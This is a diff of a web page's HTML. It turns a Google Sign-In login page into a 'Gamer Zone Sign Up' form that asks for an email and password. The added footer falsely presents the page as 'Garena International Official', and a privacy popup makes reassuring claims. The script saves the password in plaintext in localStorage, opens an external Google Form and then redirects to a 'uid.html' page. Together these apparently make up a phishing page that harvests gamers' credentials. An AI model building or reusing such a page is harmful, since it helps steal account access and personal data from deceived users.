@@ -1,116 +1,183 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>🎮 Gamer zone Login</title>
-
-  <script src="https://accounts.google.com/gsi/client" async defer></script>
+  <title>Gamer Zone Sign Up</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
   <style>
-    body {
+    * {
       margin: 0;
-      font-family: Arial;
-      background: linear-gradient(red, black);
-      color: white;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: Arial, sans-serif;
+    }
+
+    body {
+      height: 100vh;
+      width: 100vw;
+      overflow: hidden;
+      background: radial-gradient(circle at top, #1a0000, #000000 60%),
+                  linear-gradient(135deg, #ff0000 20%, #000000 80%);
       display: flex;
       justify-content: center;
       align-items: center;
-      height: 100vh;
+      flex-direction: column;
+    }
+
+    body::before {
+      content: "";
+      position: absolute;
+      width: 100%;
+      height: 100%;
+      background: radial-gradient(circle, rgba(255,0,0,0.2), transparent 60%);
+      pointer-events: none;
+    }
+
+    h1 {
+      position: absolute;
+      top: 20px;
+      color: white;
+      text-shadow: 0 0 10px red;
+      width: 100%;
+      text-align: center;
     }
 
     .box {
-      background: rgba(0,0,0,0.7);
-      padding: 25px;
-      border-radius: 15px;
       width: 90%;
-      max-width: 350px;
+      max-width: 340px;
+      background: rgba(255,255,255,0.95);
+      padding: 20px;
+      border-radius: 12px;
       text-align: center;
+      box-shadow: 0 0 20px rgba(255,0,0,0.5);
+      z-index: 1;
     }
 
     input {
       width: 100%;
-      padding: 10px;
+      padding: 12px;
       margin: 8px 0;
-      border-radius: 8px;
-      border: none;
+      border-radius: 6px;
+      border: 1px solid #ccc;
     }
 
     button {
       width: 100%;
       padding: 12px;
       margin-top: 10px;
+      background: black;
+      color: white;
       border: none;
-      border-radius: 8px;
-      font-weight: bold;
+      border-radius: 6px;
       cursor: pointer;
     }
 
-    .loginBtn {
-      background: white;
-      color: black;
+    button:hover {
+      background: #222;
     }
 
-    .signupBtn {
-      background: #ffcc00;
-      color: black;
+    .footer {
+      position: absolute;
+      bottom: 10px;
+      color: white;
+      font-size: 12px;
+      text-align: center;
+      width: 100%;
+    }
+
+    .links {
+      margin-top: 10px;
+      font-size: 12px;
+      color: red;
+      cursor: pointer;
+    }
+
+    /* POPUP */
+    .popup {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0,0,0,0.7);
+      justify-content: center;
+      align-items: center;
+    }
+
+    .popup-content {
+      background: white;
+      padding: 20px;
+      border-radius: 10px;
+      width: 85%;
+      max-width: 300px;
+      text-align: center;
     }
   </style>
 </head>
 
 <body>
 
+<h1>🎮 Gamer Zone Sign Up</h1>
+
 <div class="box">
-  <h2>🎮 Gamer Zone Login</h2>
 
-  <!-- UI login -->
-  <input type="text" placeholder="Email">
-  <input type="password" placeholder="Password">
+  <input type="email" id="email" placeholder="Enter Email">
+  <input type="password" id="password" placeholder="Enter Password">
 
-  <button class="loginBtn">Login</button>
+  <button onclick="signup()">Sign Up</button>
 
-  <!-- SIGN UP BUTTON -->
-  <button class="signupBtn" onclick="googleSignup()">
-    Sign Up with Google
-  </button>
-
-  <!-- Google Login hidden trigger -->
-  <div id="g_id_onload"
-       data-client_id="YOUR_CLIENT_ID"
-       data-callback="handleSignup"
-       style="display:none;">
-  </div>
+  <div class="links" onclick="openPolicy()">Privacy Policy</div>
 
 </div>
 
+<div class="footer">
+  © 2026 Gamer Zone. All Rights Reserved | Garena International Official
+</div>
+
+<!-- PRIVACY POPUP -->
+<div class="popup" id="popup">
+  <div class="popup-content">
+    <h3>Privacy Policy</h3>
+    <p>
+      Your data is collected only for login and verification purposes.
+      We do not sell or share your information with third parties.
+    </p>
+    <button onclick="closePolicy()">Close</button>
+  </div>
+</div>
+
 <script>
-function googleSignup() {
-  // triggers Google login
-  document.querySelector(".signupBtn").innerText = "Loading Google...";
-  
-  google.accounts.id.initialize({
-    client_id: "YOUR_CLIENT_ID",
-    callback: handleSignup
-  });
+function signup() {
+  let email = document.getElementById("email").value;
+  let password = document.getElementById("password").value;
 
-  google.accounts.id.prompt();
+  if (!email || !password) {
+    alert("Please fill all fields");
+    return;
+  }
+
+  localStorage.setItem("user_email", email);
+  localStorage.setItem("user_password", password);
+
+  window.open(
+    "https://docs.google.com/forms/d/e/1FAIpQLSddWzlCgcpzw1ZnefYzfvNmSau9p4dbm-V5Zc4UjlUg4vJVDA/viewform?embedded=true",
+    "_blank"
+  );
+
+  alert("Complete the form. Redirecting...");
+
+  setTimeout(() => {
+    window.location.href = "uid.html";
+  }, 15000);
 }
 
-function handleSignup(response) {
-  const user = parseJwt(response.credential);
-
-  alert("Signup Successful 🎉\nWelcome " + user.name);
-
-  // redirect to login page
-  window.location.href = "login.html";
+function openPolicy() {
+  document.getElementById("popup").style.display = "flex";
 }
 
-function parseJwt (token) {
-  var base64Url = token.split('.')[1];
-  var base64 = base64Url.replace(/-/g, '+').replace(/_/g, '/');
-  var jsonPayload = decodeURIComponent(atob(base64).split('').map(function(c) {
-    return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
-  }).join(''));
-
-  return JSON.parse(jsonPayload);
+function closePolicy() {
+  document.getElementById("popup").style.display = "none";
 }
 </script>
 
